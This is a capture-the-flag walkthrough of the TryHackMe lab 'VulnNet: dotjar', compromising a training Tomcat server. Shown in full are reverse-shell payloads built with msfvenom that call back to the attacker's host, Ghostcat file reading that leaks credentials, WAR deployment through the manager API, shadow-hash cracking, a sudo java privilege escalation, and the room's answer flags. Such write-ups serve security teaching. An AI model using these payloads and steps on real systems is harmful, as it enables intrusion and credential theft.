<h1 align="center">VulnNet: dotjar</h1>
<p align="center">2025, August 12<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>463</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>VulnNet Entertainment never gives up... are you ready?</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/1952036c-7486-48f0-815b-06c84ba9b6d3"><br>
Access this CTF <a href="https://tryhackme.com/room/vulnnetdotjar">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/662c32eb-7220-422c-b97b-20c7b1047b66"></p>

<br>

<h2>Task 1 . VulnNet: dotjar</h2>
<p>VulnNet Entertainment works with the best and this is why they choose you again to perform a penetration test of their newly deployed service. Get ready!<br>

- Difficulty: Medium<br>
- Web Language: Java<br><br>

A new machine means a new web implementation. Foothold should be rather easy-going as long as you connect the dots. Privilege escalation might depend on your Java knowledge, don't worry though, I'm rather a person who avoids Java and I still had a lot of fun working on this machine.<br><br>

Icon made by Freepik from www.flaticon.com</p>

<p><em>Answer the questios below</em></p>


<img width="1885" height="382" alt="image" src="https://github.com/user-attachments/assets/b32e8a76-f7e7-4d81-8f1c-1919e3c67518" />



<br>
<h3>Nmap</h3>

```bash
:~/VulnNetDotJAR# nmap -A -T4 10.201.69.245
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-12 17:33 BST
Nmap scan report for ip-10-201-69-245.ec2.internal (10.201.69.245)
Host is up (0.00028s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
```

<br>search 

```bash
:~# nmap --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p8009 10.201.69.245
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-12 18:10 BST
Nmap scan report for 10.201.69.245
Host is up (0.000082s latency).

PORT     STATE SERVICE
8009/tcp open  ajp13
| ajp-headers: 
|_  Content-Type: text/html;charset=UTF-8
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
| ajp-request: 
| AJP/1.3 200 200
| Content-Type: text/html;charset=UTF-8
| 
| tps://tomcat.apache.org/taglibs/">Taglibs</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Other Documentation</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/connectors-doc/">Tomcat Connectors</a></li>
|                             <li><a href="https://tomcat.apache.org/connectors-doc/">mod_jk Documentation</a></li>
|                             <li><a href="https://tomcat.apache.org/native-doc/">Tomcat Native</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Get Involved</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/getinvolved.html">Overview</a></li>
|                             <li><a href="https://tomcat.apache.org/source.html">Source Repositories</a></li>
|                             <li><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></li>
|                             <li><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Miscellaneous</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/contact.html">Contact</a></li>
|                             <li><a href="https://tomcat.apache.org/legal.html">Legal</a></li>
|                             <li><a href="https://www.apache.org/foundation/sponsorship.html">Sponsorship</a></li>
|                             <li><a href="https://www.apache.org/foundation/thanks.html">Thanks</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Apache Software Foundation</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/whoweare.html">Who We Are</a></li>
|                             <li><a href="https://tomcat.apache.org/heritage.html">Heritage</a></li>
|                             <li><a href="https://www.apache.org">Apache Home</a></li>
|                             <li><a href="https://tomcat.apache.org/resources.html">Resources</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <br class="separator" />
|             </div>
|             <p class="copyright">Copyright &copy;1999-2025 Apache Software Foundation.  All Rights Reserved</p>
|         </div>
|     </body>
| 
|_</html>
MAC Address: 16:FF:D3:97:4F:AB (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

```bash
echo 10.201.69.245 dotjar.thm >> /etc/hosts
```

<br>
<h3>Gobuster</h3>

```bash
:~# gobuster dir -u http://dotjar.thm:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dotjar.thm:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/http%3A%2F%2Fwww     (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 804]
/http%3A%2F%2Fblog    (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 804]
/External%5CX-News    (Status: 400) [Size: 795]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 804]
/http%3A%2F%2Fradar   (Status: 400) [Size: 804]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 804]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 804]
/http%3A%2F%2Fswik    (Status: 400) [Size: 804]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


```bash
gobuster dir -u http://dotjar.thm:8080/manager/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dotjar.thm:8080/manager/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> /manager/images/]
/html                 (Status: 401) [Size: 2499]
/text                 (Status: 401) [Size: 2499]
/status               (Status: 401) [Size: 2499]
/http%3A%2F%2Fwww     (Status: 400) [Size: 804]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 804]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 804]
/http%3A%2F%2Fblog    (Status: 400) [Size: 804]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 804]
/External%5CX-News    (Status: 400) [Size: 795]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 804]
/http%3A%2F%2Fradar   (Status: 400) [Size: 804]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 804]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 804]
/http%3A%2F%2Fswik    (Status: 400) [Size: 804]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


<br>
<h3>xx.xxx.xx.xxx:8080</h3>

<img width="1123" height="715" alt="image" src="https://github.com/user-attachments/assets/0502e9d0-9ea6-46ed-b052-20b7aa487ba5" />

<br>


```bash
:~/VulnNetDotJAR# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.201.1.67 LPORT=4444 -f war -o rev.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
Saved as: rev.war
```

<br>

```bash
msf6 > search ghostcat

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat

msf6 > use 0
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.201.69.245
RHOSTS => 10.201.69.245
msf6 auxiliary(admin/http/tomcat_ghostcat) > set Verbose True
Verbose => true
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.201.69.245
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
 
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:Hgj3LA$02D$Fa@21
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>
[+] 10.201.69.245:8009 - File contents save to: /root/.msf4/loot/20250812181338_default_10.201.69.245_WEBINFweb.xml_200413.txt
[*] Auxiliary module execution completed
msf6 auxiliary(admin/http/tomcat_ghostcat) > 
```

<br>


```bash
 webdev:Hgj3LA$02D$Fa@21
```

<br>

<img width="1129" height="720" alt="image" src="https://github.com/user-attachments/assets/04938d49-0cde-46a5-a273-f31cad2e7035" />

<br>

<img width="1131" height="718" alt="image" src="https://github.com/user-attachments/assets/5f6dfabc-7515-44b5-bf3f-16ee778e6a7c" />


```bash
 webdev:Hgj3LA$02D$Fa@21
```

<br>

```bash
:~/VulnNetDotJAR# curl --upload-file rev.war -u webdev:'Hgj3LA$02D$Fa@21' 'http://dotjar.thm:8080/manager/text/deploy?path=/'
OK - Deployed application at context path [/rev.war]
```

<br>

<img width="1223" height="193" alt="image" src="https://github.com/user-attachments/assets/f8fd29d2-aaa1-4cbc-b672-6667b79e96ca" />

<br>

```bash
web@ip-10-201-69-245:/$ cd /home
web@ip-10-201-69-245:/home$ ls
jdk-admin  ssm-user  ubuntu  web
web@ip-10-201-69-245:/home$
```

<br>

```bash
web@ip-10-201-69-245:/$ ls -lah /var/backups/shadow-backup-alt.gz
-rw-r--r-- 1 root root 485 Jan 16  2021 /var/backups/shadow-backup-alt.gz
```

<br>

```bash
web@ip-10-201-69-245:/$ file /var/backups/shadow-backup-alt.gz
/var/backups/shadow-backup-alt.gz: gzip compressed data, was "shadow", last modified: Sat Jan 16 12:44:11 2021, from Unix, original size modulo 2^32 1179
```

<br>

```bash
web@ip-10-201-69-245:/dev/shm$ cp /var/backups/shadow-backup-alt.gz .
web@ip-10-201-69-245:/dev/shm$ gunzip shadow-backup-alt.gz
web@ip-10-201-69-245:/dev/shm$ ls
shadow-backup-alt
web@ip-10-201-69-245:/dev/shm$ file shadow-backup-alt
shadow-backup-alt: ASCII text
```

<br>

```bash
web@ip-10-201-69-245:/dev/shm$ cat shadow-backup-alt
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
daemon:*:18642:0:99999:7:::
bin:*:18642:0:99999:7:::
sys:*:18642:0:99999:7:::
sync:*:18642:0:99999:7:::
games:*:18642:0:99999:7:::
man:*:18642:0:99999:7:::
lp:*:18642:0:99999:7:::
mail:*:18642:0:99999:7:::
news:*:18642:0:99999:7:::
uucp:*:18642:0:99999:7:::
proxy:*:18642:0:99999:7:::
www-data:*:18642:0:99999:7:::
backup:*:18642:0:99999:7:::
list:*:18642:0:99999:7:::
irc:*:18642:0:99999:7:::
gnats:*:18642:0:99999:7:::
nobody:*:18642:0:99999:7:::
systemd-network:*:18642:0:99999:7:::
systemd-resolve:*:18642:0:99999:7:::
syslog:*:18642:0:99999:7:::
messagebus:*:18642:0:99999:7:::
_apt:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
lightdm:*:18642:0:99999:7:::
whoopsie:*:18642:0:99999:7:::
kernoops:*:18642:0:99999:7:::
pulse:*:18642:0:99999:7:::
avahi:*:18642:0:99999:7:::
hplip:*:18642:0:99999:7:::
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
web@ip-10-201-69-245:/dev/shm$ 
```

<br>

```bash
web@ip-10-201-69-245:/dev/shm$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
jdk-admin:x:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
systemd-timesync:x:112:123:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
tss:x:113:124:TPM software stack,,,:/var/lib/tpm:/bin/false
tcpdump:x:114:127::/nonexistent:/usr/sbin/nologin
geoclue:x:115:128::/var/lib/geoclue:/usr/sbin/nologin
saned:x:116:129::/var/lib/saned:/usr/sbin/nologin
fwupd-refresh:x:117:130:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sddm:x:118:131:Simple Desktop Display Manager:/var/lib/sddm:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
sshd:x:119:65534::/run/sshd:/usr/sbin/nologin
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
web@ip-10-201-69-245:/dev/shm$ 
```

<br>

```bash
root@ip-10-201-1-67:~/VulnNetDotJAR# unshadow passwd.txt shadow.txt
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:0:0:root:/root:/bin/bash
...
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:1001:1001:,,,:/home/web:/bin/bash
...
ssm-user:x:1002:1002::/home/ssm-user:/bin/sh
...
ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
```

<br>

<img width="1312" height="729" alt="image" src="https://github.com/user-attachments/assets/debf80c1-e713-4743-bc0b-9ff98a68b809" />

<br>

```bash
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:0:0:root:/root:/bin/bash
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:1000:1000:jdk-admin,,,:/home/jdk-admin:/bin/bash
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:1001:1001:,,,:/home/web:/bin/bash
```

<br>

```bash
:~/VulnNetDotJAR# john hashes --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
794613852        (jdk-admin)
```

<br>
<h3>John the Ripper</h3>
<p>

- jdk-admin : 794613852</p>

```bash
:~/VulnNetDotJAR# john hashes --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
794613852        (jdk-admin)
```

<br>
<h3>su</h3>

```bash
web@ip-10-201-69-245:/dev/shm$ su jdk-admin
Password: 
jdk-admin@ip-10-201-69-245:/dev/shm$ 
```

<br>

```bash
web@ip-10-201-69-245:/dev/shm$ su jdk-admin
Password: 
jdk-admin@ip-10-201-69-245:/dev/shm$ 
```

<br>

```bash
jdk-admin@ip-10-201-69-245:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
jdk-admin@ip-10-201-69-245:~$ cat user.txt
THM{1ae87fa6ec2cd9f840c68cbad78e9351}
```

<br>

<p>1.1. Ehat is the user flag? (user.txt)<br>
<code>THM{1ae87fa6ec2cd9f840c68cbad78e9351}</code></p>

<br>


```bash
jdk-admin@ip-10-201-69-245:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
Matching Defaults entries for jdk-admin on ip-10-201-69-245:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on ip-10-201-69-245:
    (root) /usr/bin/java -jar *.jar
```

<br>

```bash
:~/VulnNetDotJAR# msfvenom -p java/shell_reverse_tcp LHOST=10.201.1.67 LPORT=9001 -f jar > rev.jar
Payload size: 7502 bytes
Final size of jar file: 7502 bytes
```

```bash
:~/VulnNetDotJAR# nc -nlvp 9001
```


```bash
:~/VulnNetDotJAR# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
jdk-admin@ip-10-201-69-245:/dev/shm$ wget http://10.201.1.67:8000/rev.jar
--2025-08-12 20:01:36--  http://10.201.1.67:8000/rev.jar
Connecting to 10.201.1.67:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7502 (7.3K) [application/java-archive]
Saving to: \u2018rev.jar\u2019

rev.jar             100%[===================>]   7.33K  --.-KB/s    in 0s      

2025-08-12 20:01:36 (425 MB/s) - \u2018rev.jar\u2019 saved [7502/7502]

jdk-admin@ip-10-201-69-245:/dev/shm$ sudo /usr/bin/java -jar rev.jar
Password: 
```

<br>

```bash
:~/VulnNetDotJAR# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.69.245 - - [12/Aug/2025 19:01:37] "GET /rev.jar HTTP/1.1" 200 -

```



```bash
:~/VulnNetDotJAR# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.201.69.245 57174
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@ip-10-201-69-245:/dev/shm# cat /root/root.txt
cat /root/root.txt
THM{464c29e3ffae05c2e67e6f0c5064759c}
root@ip-10-201-69-245:/dev/shm# 
```

<br>
<br>




<img width="1911" height="895" alt="image" src="https://github.com/user-attachments/assets/ad1d913c-01e8-47e9-a5a2-68d2a3804f3a" />

<img width="1912" height="890" alt="image" src="https://github.com/user-attachments/assets/adb1374b-f9eb-41b3-807d-c30239a9778d" />


